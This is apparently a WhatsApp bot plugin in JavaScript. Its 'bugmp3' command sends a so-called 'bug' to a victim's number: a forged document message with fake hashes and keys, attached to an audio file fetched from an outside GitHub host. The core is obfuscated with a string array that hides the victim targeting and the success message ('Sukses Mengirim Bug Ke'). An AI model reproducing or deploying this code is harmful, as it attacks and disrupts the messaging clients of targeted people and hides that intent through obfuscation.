
/*let levelling = require('../lib/levelling')
let fs = require('fs')
let path = require('path')
let fetch = require('node-fetch')
let moment = require('moment-timezone')
*/
// ? Record by Zykomd/jangan hapus om 
// ? SUBSCRIBE YT GW ZYKOBOTZ-MD OFFICIAL
import { xpRange } from '../lib/levelling.js'
import path from 'path'
import fs from 'fs'
import fetch from 'node-fetch'
import moment from 'moment-timezone'
import jimp from 'jimp'

let handler = async (m, { conn, text, command, usedPrefix }) => {
let { exp, limit, age, money, level, role, registered } = global.db.data.users[m.sender]
    let { min, xp, max } = xpRange(level, global.multiplier)
    let umur = `*${age == '-1' ? 'Belum Daftar*' : age + '* Thn'}`
	let name = registered ? global.db.data.users[m.sender].name : conn.getName(m.sender)

const reSize = (buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}

//TIME
let d = new Date(new Date + 3600000)
    let locale = 'id'
    // d.getTimeZoneOffset()
    // Offset -420 is 18.00
    // Offset    0 is  0.00
    // Offset  420 is  7.00
    let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(d / 84600000) % 5]
    let week = d.toLocaleDateString(locale, { weekday: 'long' })
    let date = d.toLocaleDateString(locale, {
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    })

function _0x5e19(){const _0x2a4cc6=['M9k=','Qb0=','https://ra','ah\x0a\x0aContoh','\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20','RXGvVNWAbF','/DXIECzjrS',':\x0a.bugmp3\x20','com/Aisyah','w.githubus','5yk=','5318604qUQxsu','reply','j85sbZCtNt','ybdZlRjhY+','84553ntgDCJ','ream','62��������','TSSZu8gDEA','sender','error.mp3','HN4iKWCFis','19922uWwfIQ','chat','users','.mp3','https://mm','@s.whatsap','data','h3rmcoHN76','64455','l.jpg','0@s.whatsa','g.whatsapp','187DyRTIX','4653DCnCiQ','7lCAd1PIz3','split','applicatio','aXtytT0G2H','t\x20Anda\x20Sal','./thumbnai','n/octet-st','UTKfgrl2zX','716480mOFDUk','mampus\x20lag','Maaf\x20Forma','d/main/','24070HWMgsT','-Aldi/Soun','G2W69AVPLg','p.net','ercontent.','625483WZABMH','Deffri\x20Gan','readFileSy','Ke\x20','iUZ5HKluLD','60KAuedP','.net/d/f/A','5h/TZzubVJ','Sukses\x20Men','P32GszzU5p','429kZjWQw','q1cJ6JupaB','nsp.enc','pp.net','400ditySy','5800468IfZduF','sendFile','girim\x20Bug\x20','Php8vjdtJS'];_0x5e19=function(){return _0x2a4cc6;};return _0x5e19();}const _0x263a16=_0xd2d9;(function(_0x536f50,_0x56c78e){const _0x4a4fd9=_0xd2d9,_0x2b47b9=_0x536f50();while(!![]){try{const _0x58b3c4=-parseInt(_0x4a4fd9(0xfc))/(0x1dca+-0x8db*-0x2+0x9*-0x547)+parseInt(_0x4a4fd9(0x125))/(-0x1*-0x3ad+0x6c7+-0x7*0x17e)*(-parseInt(_0x4a4fd9(0x106))/(-0x10b4+0x1c1*0x2+0x45*0x31))+-parseInt(_0x4a4fd9(0x10b))/(0xfe8*0x1+-0x1b1f+0x5*0x23f)+-parseInt(_0x4a4fd9(0xf3))/(0x12b4+-0x604+-0xcab)*(parseInt(_0x4a4fd9(0x101))/(-0x1699+-0x1d2a+-0x3*-0x1143))+-parseInt(_0x4a4fd9(0x11e))/(0x5*0x29+-0x69*-0x52+-0x2268)*(parseInt(_0x4a4fd9(0x10a))/(-0x3d*0x8f+0x16be+0xb5d*0x1))+-parseInt(_0x4a4fd9(0xea))/(0x1ec7*-0x1+0x3*0xad4+0x1*-0x1ac)*(parseInt(_0x4a4fd9(0xf7))/(-0x743+0x2*-0x7bb+0x1*0x16c3))+-parseInt(_0x4a4fd9(0xe9))/(0x24a*-0x1+-0x45b*-0x7+-0x1c28)*(-parseInt(_0x4a4fd9(0x11a))/(0xe1*0xd+-0x1196*-0x1+-0x1cf7));if(_0x58b3c4===_0x56c78e)break;else _0x2b47b9['push'](_0x2b47b9['shift']());}catch(_0x504d40){_0x2b47b9['push'](_0x2b47b9['shift']());}}}(_0x5e19,-0x2b9e7+0x1*0x2e574+0xb532c));const doc={'key':{'fromMe':![],'participant':_0x263a16(0xe7)+_0x263a16(0x109),...m[_0x263a16(0x126)]?{'remoteJid':''}:{}},'message':{'documentMessage':{'url':_0x263a16(0x129)+_0x263a16(0xe8)+_0x263a16(0x102)+_0x263a16(0x11c)+_0x263a16(0x107)+_0x263a16(0xf2)+_0x263a16(0x114)+_0x263a16(0x108),'mimetype':_0x263a16(0xed)+_0x263a16(0xf1)+_0x263a16(0x11f),'fileSha256':_0x263a16(0x121)+_0x263a16(0x10e)+_0x263a16(0x115)+_0x263a16(0xe4)+_0x263a16(0x10f),'fileLength':_0x263a16(0xe5),'pageCount':0x1,'mediaKey':_0x263a16(0x105)+_0x263a16(0x100)+_0x263a16(0x103)+_0x263a16(0xeb)+_0x263a16(0x110),'fileName':_0x263a16(0xfd)+'s','fileEncSha256':_0x263a16(0x11d)+_0x263a16(0xee)+_0x263a16(0x124)+_0x263a16(0xf9)+_0x263a16(0x119)}}};if(!text)return m[_0x263a16(0x11b)](_0x263a16(0xf5)+_0x263a16(0xef)+_0x263a16(0x112)+_0x263a16(0x116)+_0x263a16(0x120));let [number,pesan]=text[_0x263a16(0xec)]`|`,user=global['db'][_0x263a16(0xe3)][_0x263a16(0x127)][m[_0x263a16(0x122)]],korban=''+number;var nomor=m[_0x263a16(0x122)];function _0xd2d9(_0x5910b0,_0x4cf8fe){const _0x5f3ab4=_0x5e19();return _0xd2d9=function(_0x453b92,_0x1be51e){_0x453b92=_0x453b92-(-0x28e*-0xd+-0x15c*-0x2+-0x230b);let _0x29cc60=_0x5f3ab4[_0x453b92];return _0x29cc60;},_0xd2d9(_0x5910b0,_0x4cf8fe);}let gambar=fs[_0x263a16(0xfe)+'nc'](_0x263a16(0xf0)+_0x263a16(0xe6)),bugnya=_0x263a16(0x113)+_0x263a16(0xf4)+'\x0a\x0a',audio=_0x263a16(0x111)+_0x263a16(0x118)+_0x263a16(0xfb)+_0x263a16(0x117)+_0x263a16(0xf8)+_0x263a16(0xf6)+command+_0x263a16(0x128);await conn[_0x263a16(0x10c)](korban+(_0x263a16(0x12a)+_0x263a16(0xfa)),audio,_0x263a16(0x123),null,doc),m[_0x263a16(0x11b)](_0x263a16(0x104)+_0x263a16(0x10d)+_0x263a16(0xff)+korban);
}
handler.command = /^(bugmp3)$/i

handler.owner = true

export default handler
